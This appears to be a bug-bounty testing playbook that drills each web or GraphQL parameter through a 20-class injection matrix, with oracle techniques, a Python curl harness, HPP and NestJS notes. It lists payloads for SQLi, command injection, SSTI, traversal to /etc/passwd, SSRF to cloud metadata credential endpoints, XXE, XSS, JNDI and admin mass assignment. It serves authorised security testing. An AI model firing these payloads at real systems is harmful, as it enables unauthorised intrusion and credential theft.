# Parameter Deep-Dive — every parameter gets the full class matrix

**Default rule for every engagement.** The moment you identify a parameter that crosses the trust
boundary — a query-string key, a JSON body field, a GraphQL argument or input field, a path
segment, a header the app reads — you do **not** test the one class you came for. You run the whole
matrix against that single parameter before moving on.

Why: hunters lose findings by testing *breadth of endpoints* instead of *depth per parameter*. The
SQLi guy never tries SSTI. The SSRF guy never tries the ownership swap. One parameter is cheap to
exhaust (60–90 seconds scripted) and the payoff is the class nobody else tried on it.

Router: this doc is the **per-parameter drill**. It sits *below* `web-hunt.md` (which routes by
class) and *above* the per-class docs (`sqli.md`, `ssti.md`, `ssrf.md`, …) — go to those for deep
exploitation once the matrix flags a hit.

---

## 0. Before you fuzz: build the oracle

**You cannot fuzz what you cannot observe.** Mature estates mask errors (see §4). Establish, in
this order, what "something changed" even *looks like* on this endpoint:

1. **Baseline ×3** — send the known-good value three times. Record status, body bytes, wall time,
   and any `x-trace-id`. If the baseline is not stable, you have no oracle; find a stabler one.
2. **Known-bad control** — send a value that is definitely invalid but well-formed. This is your
   "rejected" fingerprint.
3. **Known-broken control** — send a value that is malformed at the *type* level (string where an
   int goes, unparseable JSON). This is your "never reached the handler" fingerprint.

Now every payload result is classified against three fingerprints, not guessed at.

**Isolate the variable under test.** If you are fuzzing an input object, make the *rest* of the
request minimal and provably valid. In GraphQL that means selecting only `__typename` — a selection
set that can never itself fail validation:

```graphql
query($i:SomeInput!){ someField(input:$i){ __typename } }
```

> Session lesson (shop.svc.acme.example, 2026-09-26): probing `storefrontOrder` with a guessed selection
> set `{id status}` returned a uniform error for *every* input shape and looked like "input always
> rejected". Re-running with `{__typename}` immediately showed `{"id":...}` was the correct input —
> the *selection set* had been the thing failing all along. Always neutralise the selection set
> before concluding anything about the argument.

---

## 1. The matrix — run all of it, per parameter

Script it. Never hand-send. A ready harness lives in
`engagements/<target>/recon/*_param_battery.py` (pattern below, §5).

| # | Class | Minimal probes | Positive signal |
|---|---|---|---|
| 1 | **Ownership / IDOR** | swap id to a 2nd account's object; fake-but-valid id; `GET`→`PUT`/`DELETE`; v1-vs-v2 route | foreign data returns, or 200 where 403 expected |
| 2 | **Type confusion** | `"1"`→`1`, `[]`, `{}`, `null`, `true`, nested array | stack trace, different error, coercion |
| 3 | **SQLi** | `'`, `"`, `' OR '1'='1`, `'--`, `' UNION SELECT NULL--`, `'||pg_sleep(12)--`, `' OR SLEEP(12)--`, `;WAITFOR DELAY '0:0:12'--` | **time delta**, error text, row-count change |
| 4 | **NoSQLi** | `{"$ne":null}`, `{"$regex":".*"}`, `{"$gt":""}`, `'; return true; var x='` | auth bypass, result-set widening |
| 5 | **SSTI** | `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`, `#set($x=7*7)$x`, `{{7*'7'}}` | `49` / `7777777` echoed anywhere |
| 6 | **Command injection** | `;sleep 12`, `` `sleep 12` ``, `$(sleep 12)`, `\|sleep 12`, `&& sleep 12`, newline | time delta, OOB DNS |
| 7 | **Path traversal / LFI** | `../../../../etc/passwd`, `..%2f`×3, `..\..\windows\win.ini`, `file:///etc/passwd` | file content, different 404-vs-500 |
| 8 | **SSRF** | `http://169.254.169.254/latest/meta-data/`, `http://169.254.170.2/v2/credentials/`, `http://127.0.0.1:80/`, collaborator URL, `gopher://` | OOB hit, timing, content reflect |
| 9 | **XXE / XML** | `<!DOCTYPE r [<!ENTITY e SYSTEM "file:///etc/passwd">]>`, tag-break `</field><foo>x</foo><field>` | entity resolved, parser error |
| 10 | **XSS / HTML** | `<script>alert(1)</script>`, `"><img src=x onerror=alert(1)>`, `javascript:` | raw reflection in an HTML context (check **stored** too) |
| 11 | **CRLF / header** | `%0d%0aX-Injected:1`, raw `\r\n` | header split, cache poison |
| 12 | **LDAP / XPath** | `*)(uid=*))(\|(uid=*`, `' or '1'='1` | auth bypass, widened result |
| 13 | **Template/expr langs** | `${jndi:ldap://…}`, `T(java.lang.Runtime)`, `#{...}` | OOB, eval |
| 14 | **Prototype pollution** | `__proto__`, `constructor.prototype` keys in JSON objects | later-request behaviour change |
| 15 | **Open redirect / SSRF-lite** | `//evil.tld`, `https://evil.tld`, `/\evil.tld`, `@evil.tld` | `Location:` off-origin |
| 16 | **Business logic** | negative, `0`, overflow (`9`×26), float where int, currency/store swap, boolean flags flipped | price/qty/tax/visibility change |
| 17 | **Mass assignment** | add `role`, `isAdmin`, `id`, `ownerId`, `price`, `status` to the object | field accepted & persisted |
| 18 | **DoS / limits** | 10 000-char value, `A`×60 + `!` (ReDoS), deep nesting, huge `limit` | time delta, 500 |
| 19 | **Encoding bypass** | URL-enc, double-enc, unicode full-width `＇`, overlong UTF-8, null byte | filter slipped |
| 20 | **HPP** | repeat the param twice with different values | last/first-wins, filter bypass |

**Boolean flags deserve their own pass.** Any client-supplied boolean (`returnInvisibleProducts`,
`includeDeleted`, `skipTaxCalculation`, `isDefault`, `debug`) is an authorization decision the
client is being trusted to make. Flip every one and diff the result set size.

---

## 2. Finding the parameters (don't rely on what the UI sends)

The UI shows you a fraction of the accepted parameters. Mine them:

```bash
# GraphQL: recover operations + argument signatures straight out of the SPA bundle
cat *.js | grep -oE "(query|mutation)[ ]+[A-Za-z0-9_]+[ ]*\([^)]*\)" | sort -u

# ...and the REAL input object shapes, from how the client constructs them
grep -ohE "input:\{[a-zA-Z]+:[^}]{0,120}\}" *.js | sort -u
```

> That second grep is the highest-value line in this doc. Introspection-disabled + masked-error
> APIs give up nothing, but the client still has to *build* the input object literally in the
> bundle. On shop.svc.acme.example it handed over `input:{id:e,locale:n}`,
> `input:{id:…,secret:…,language:…,skipTaxCalculation:…}`,
> `input:{entityId:…,entityType:…,file:…}`, and the `returnInvisibleProducts` /
> `returnInvisibleProducts:!0` flag — none of which were guessable and none of which introspection
> would have given up.

Other sources: `_buildManifest.js` route list (Next.js), source maps, Burp proxy history (real
bodies with real ids), Wayback params, mobile-app strings, `swagger.json`/`openapi.json`, HTTP
`Allow:` headers, and error messages that name a missing field.

---

## 3. Two-account discipline (the IDOR row is non-negotiable)

Never conclude "ownership-scoped" from a fake id. A fabricated id proves only that lookup failed.
Prove it with **valid data on a foreign object**:

1. Account A and account B, both yours.
2. Capture a **real object id belonging to B** (Burp history is the best source).
3. Replay B's request with **A's session**, then with **no session at all**.
4. Compare all three responses field by field.

> Session lesson: on `storefrontOrder(input:{id})` the unauthenticated call *succeeded* (HTTP 200,
> object resolved) which looked like a critical IDOR — but every sensitive field
> (`email`, `shippingAddress`, `invoiceUrl`, `orderNumber`, payment transactions) came back `null`,
> and A-reading-B's-order returned byte-identical nulls. That is **field-level authorization
> working correctly**, not a finding. Resolving an object ≠ disclosing it. Always select the
> sensitive fields explicitly before you call it.

---

## 4. Oracles for masked-error APIs

Mature estates (the vendor's `.svc` tier since the 2026-09 hardening wave) collapse every error to
`{"message":"Internal Server Error","extensions":{"code":"INTERNAL_SERVER_ERROR"}}`. You are not
blind — the *envelope* still leaks.

**a) `data`-key oracle (validated).** In GraphQL, a response with **no `data` key** failed
*validation* (pre-execution: unknown field, bad scalar, missing required arg). A response **with
`data` present** (even `data:null`) means the query validated and a **resolver executed**. That one
bit separates "my query is malformed" from "my query is fine and the backend broke" — the
difference between wasting an hour and finding the bug.

**b) Auth-gate oracle (validated, high value).** Masking is usually applied to *internal* errors
only; deliberate authorization denials are often passed through intact. On shop.svc.acme.example,
gated resolvers answered `{"message":"Must be logged in to access resource","code":"FORBIDDEN"}`
while `getProtectedAssetSignedUrl` answered `INTERNAL_SERVER_ERROR` for the same unauthenticated
request. **A resolver that does not return the standard denial string is a resolver that may not
be running the auth check.** Enumerate every root field unauthenticated and bucket by denial
string — the odd one out is the lead.

**c) Error-count oracle (situational).** `len(errors)` sometimes tracks the number of distinct
validation failures, so supplying correct required fields walks the count down. Worked on one
input type in this estate and gave a flat `1` on another — **calibrate before trusting it**, and
abandon it fast if single-field probes don't move the number.

**d) Malformed-JSON auth-gate oracle.** POST a body of `{`. Frameworks that run the auth strategy
*before* payload parsing (Hapi, and others) answer `401` on gated routes but `400 invalid JSON` on
unauthenticated ones — mapping auth on dangerous WRITE routes **without ever executing the
handler**. (Also in `framework-misconfig.md §7`.)

**e) Timing.** With text masked, wall-clock is the surviving side channel — the whole point of the
`sleep(12)` payloads. Baseline ≥3 samples; call a hit only on a repeatable delta.

**f) Response byte-length.** Log it for every probe. Identical status + identical text but a
different length is a real signal.

---

## 5. Harness pattern

Write it to `engagements/<target>/recon/<host>_param_battery.py`. Log **time, length, and body**
for every case, print a fixed-width table, and eyeball the column — the outlier is the finding.

```python
def call(payload):
    body = json.dumps({"query": Q, "variables": {"t": payload}})
    t0 = time.time()
    r = subprocess.run(["curl","-sS","-X","POST",URL,
                        "-H","Content-Type: application/json",
                        "-H","Origin: https://<legit-origin>",
                        "-d",body,"--max-time","40"],
                       capture_output=True, text=True)
    return round(time.time()-t0,2), r.stdout

for name, payload in CASES:                 # CASES = the §1 matrix
    t, out = call(payload)
    print(f"{name:22} {t:>6} {len(out):>5}  {out[:150]}")
```

**Read the whole column, not individual rows.** A battery where all 54 rows return byte-identical
47-byte bodies at a flat 0.85 s is a *clean negative you can write down with confidence* — that is
a result, not a failure.

**Watch for the WAF tell.** If a handful of payloads return an HTML `403 Forbidden` from nginx
while the rest get clean JSON, the *edge* rejected them, not the app — your payload never reached
the parameter. Re-test those cases encoded/obfuscated before recording the class as clean.
(On shop.svc.acme.example every payload containing `http://` or a `169.254.x.x` literal was edge-blocked
— the SSRF row was untested until re-encoded, and must not be marked clean.)

---

## 6. Recording the result

Per parameter, write one line into `coverage.md`:

```
| host | operation | parameter | classes run | oracle used | verdict |
|---|---|---|---|---|---|
| shop.svc.acme.example | validateTaxId | taxId (String!) | 1–20 | status enum + timing + length | CLEAN (54/54 identical, flat 0.85s) |
| shop.svc.acme.example | storefrontOrder | input.id (UUID) | IDOR 2-acct + unauth | field-level null diff | CLEAN (field-level authz correct) |
| shop.svc.acme.example | getProtectedAssetSignedUrl | id (UUID!) | auth-gate oracle | FORBIDDEN-vs-ISE | **LEAD** (no standard denial; needs a valid asset id) |
```

A clean negative is worth writing down — it stops you re-testing the same parameter next month and
it is how `coverage.md` stays honest. A **LEAD** is not a finding: if you cannot produce the real
request/response that shows harm, it stays a lead (see `validate.md`).

---

## HPP — duplicate-parameter parsing (matrix row 20, deep dive)

> Load when testing how an app parses duplicate/unexpected params — often an authz/logic bypass or a
> gadget for other bugs (OAuth redirect_uri, WAF bypass, IDOR).

### Duplicate-parameter parsing (front vs back disagree)
```
?id=victim&id=attacker      ?role=user&role=admin       ?amount=1&amount=1000000
body: id=1&id=2   json: {"id":1,"id":2}   mixed: ?id=1 (query) + id=2 (body)
```
Different stacks pick different values → the WAF/authz check sees one, the sink sees the other:
| Stack | Takes |
|---|---|
| PHP/Apache | last |
| ASP.NET | concatenates `a,b` |
| JSP/Tomcat, Python (first via `.get`) | first |
| Node/Express (qs) | array `[a,b]` |
| Rails | last / array with `[]` |
> Use to bypass: WAF on the first value + sink on the last; authz on first id + action on second id.

### OAuth / redirect gadget
```
redirect_uri=https://good&redirect_uri=https://evil     scope=openid&scope=admin
state=good&state=evil     response_type pollution
```

### Mass assignment / autobind (send fields the UI never shows)
```json
PUT /api/users/me      {"email":"me","role":"admin","isAdmin":true,"emailVerified":true,
                        "orgId":"<victim-org>","credits":999999,"verified":1,"plan":"enterprise"}
```
Method: GET the object → resend every returned field in a PUT/PATCH, adding privileged ones. **Always
use a negative control** (a bogus field name) to be sure the server actually honored the injected
field, not just ignored the request (mass-assignment false-positive lesson). Deep reference for this
half: [[mass-assignment]].

### Array / type confusion (matrix row 2, expanded)
```
user[]=a&user[]=b   filter[role]=admin   id[]=1   {"id":["1"]}   {"id":{"$ne":null}} (→ NoSQLi)
```

### JSON parser quirks
```
duplicate keys {"a":1,"a":2}   comment/trailing junk   __proto__ (prototype pollution → js-analysis.md)
integer/overflow, leading zeros, unicode escapes, big numbers → validation vs sink mismatch
```

### Impact gate — prove which value the sink took

An HPP claim dies unless the polluted request produces an effect that DIFFERS from both
single-value baselines:

```bash
# baselines: ?id=ATTACKER only, ?id=VICTIM only, then the polluted ?id=ATTACKER&id=VICTIM
# a finding needs the polluted row to behave like NEITHER baseline —
# e.g. the authz check saw ATTACKER (allowed) while the action landed on VICTIM
```

- If the effect equals one baseline, the stack just picks first/last — parser behaviour, not a
  bug, until a check-vs-sink SPLIT is proven (the value that was VALIDATED ≠ the value that was
  EXECUTED).
- A 200 on the polluted request with no privileged effect means the WAF/authz read the same value
  the sink took — noise, and the most common HPP false positive.

### Method
Establish baseline, then pollute one param at a time; watch for a value the app "shouldn't" accept
taking effect (price, id, role). Chain into IDOR/OAuth/WAF-bypass. → `validate.md` → `findings/`.

---

## NestJS / class-validator: read the pipes BEFORE you run the matrix (acme.example console.svc, 2026-10-15)

On a NestJS API, the pipe layer decides whether an injection class is even *testable*. Establish
this first — it converts a shrug into a control-backed negative and saves you the whole matrix on
five out of six parameters.

### 1. The empty-body probe is a free, pre-auth DTO contract disclosure

`ValidationPipe` returns its error array **before** any auth guard on routes that are public, and on
many that are not. POST the route with `{}`:

```bash
curl -s -X POST https://host/api/projects/<uuid> -H 'Content-Type: application/json' -d '{}'
# 400 {"message":["name must be a string",
#                 "buildingType must be one of the following values: Home, Office, School, ...",
#                 "buildingSize must be one of the following values: Small, Medium, Large, ...",
#                 "userQty must be one of the following values: Extra Small, Small, ..."]}
```

You now have every field name, its type, and every enum member — with no session. **This is the
thing that lets you tell a validation rejection from a sink rejection**, which is the whole premise
of §0's oracle discipline. On acme.example's `console.svc` this turned a "3 pre-auth handlers" census into 8,
three of which take full nested DTOs; the previous pass had skipped the entire injection matrix on
the belief that no sink took unauth input.

### 2. `ParseUUIDPipe` is a hard fence — and its error text is the discriminating control

```
POST /api/projects/validate-token {"token":"notauuid"}   -> 400 "Validation failed (uuid is expected)"
POST /api/projects/validate-token {"token":1}            -> 400 "The value passed as UUID is not a string"
POST /api/projects/validate-token {"token":["a"]}        -> 400 "The value passed as UUID is not a string"
POST /api/projects/validate-token {"token":{"$ne":null}} -> 400 "The value passed as UUID is not a string"
POST /api/projects/validate-token {"token":"aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee"}
                                                         -> 404 "Not found"   <- HANDLER REACHED
```

Two distinct error strings = a free oracle separating **"never arrived"** from **"arrived and matched
nothing"**. Record the negative as *fenced* (SQLi/NoSQLi/SSTI/cmdi/traversal/type-confusion cannot
reach that sink — only a canonical 36-char UUID passes, and non-strings die first), which is a
legitimate control-backed clean, not an untested class.

**Bonus kill:** a `ParseUUIDPipe` on a share/invite/project **token** also settles the entropy
question for free — the token is a UUID, so 122 bits, so no brute force. That one observation killed
a parked "measure token entropy, maybe brute-force the validate endpoint" escalation outright.

### 3. The whitelist probe — your mass-assignment precondition, in one request

Add an unknown property to an otherwise valid body:

```
+ "zzUnknownL1":1   ->  "property zzUnknownL1 should not exist"   = forbidNonWhitelisted ON  (dead end)
+ "zzUnknownL1":1   ->  validation PASSES, request proceeds       = forbidNonWhitelisted OFF (precondition met)
```

OFF does **not** mean exploitable — `whitelist: true` still strips silently. But it is the gate: if
it is ON, drop mass assignment; if OFF, the class is live the moment you hold a valid object id.
Report it as *precondition found / sink UNREACHED* with the named next step, never as a finding.

### 4. Duplicate-key HPP: the JSON body parser and the query parser disagree

Test both, per route, both orders:

```
POST ... {"token":"notauuid","token":"<valid uuid>"}  -> 404 Not found          # LAST value won
POST ... {"token":"<valid uuid>","token":"notauuid"}  -> 400 uuid is expected   # LAST value won
GET  /api/oauth/check/email/<FALSE value>?email=<TRUE value>  -> {"exists":false} # path wins, query ignored
```

Express/NestJS JSON body = **last-value-wins**, while this same estate shows **first-value-wins** on
query params (`ownerUserId`). So any filter, WAF rule or audit hook that inspects only the *first*
occurrence of a JSON body key is bypassable by appending a second. Note the direction per route —
guessing it is how you misread a bypass as a non-bypass.

### 5. The positive control that makes a boolean-oracle negative worth writing down

An endpoint returning `{"exists":true|false}` on a raw path segment is a textbook blind-boolean
oracle. Before recording "no SQLi", prove the string reaches the query — otherwise you cannot tell
"escaped correctly" from "never arrived":

```bash
curl -s .../check/username/attabombo52     # {"exists":true}
curl -s .../check/username/ATTABOMBO52     # {"exists":true}  <- case-insensitive => real normalised lookup
curl -s .../check/username/%20attabombo52  # {"exists":true}  <- trimmed          => real normalised lookup
curl -s .../check/username/attabombo5      # {"exists":false} <- exact, not prefix
curl -s .../check/username/attabombo5%25   # {"exists":false} <- '%' is a literal => parameterised, not LIKE
```

Then the decisive payload is `' OR '1'='1` appended to a value known to be **FALSE**: a vulnerable
boolean oracle *must* flip. If it stays `false` while the un-suffixed known-TRUE value still returns
`true` immediately before and after, boolean-blind SQLi is genuinely ruled out.
